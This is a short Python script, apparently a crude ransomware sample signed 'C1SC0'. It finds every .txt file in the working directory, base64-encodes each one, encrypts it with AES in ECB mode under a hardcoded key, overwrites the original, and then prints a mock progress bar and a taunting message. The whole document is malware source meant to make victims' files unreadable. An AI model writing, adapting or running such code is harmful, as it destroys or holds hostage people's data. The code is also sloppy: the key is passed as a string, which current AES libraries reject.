#!/usr/bin/python3
import base64
from Crypto.Cipher import AES
import glob
import sys
import time
key = "besthacker@@@@@@"

def ranso(arq,key):
    f = open(arq, "rb").read()
    cript64 = base64.b64encode(f)
    e_c = (16 - len(cript64)) % 16
    new_crip = cript64.decode() + "@" * e_c
    aes = AES.new(key, AES.MODE_ECB)
    new_crack = aes.encrypt(new_crip)
    f = open(arq, "wb")
    f.write(new_crack)
    f.close()
    print("%s encryptado..\n" % (arq))

lista = glob.glob("*.txt")
for i in range(0,len(lista)):
    arq = lista[i]
    ranso(arq, key)

for i in range(0,10):
    sys.stdout.write("#")
    sys.stdout.flush()
    time.sleep(0.2)

print("Pc Cryptografado By\n")
print("C1SC0")
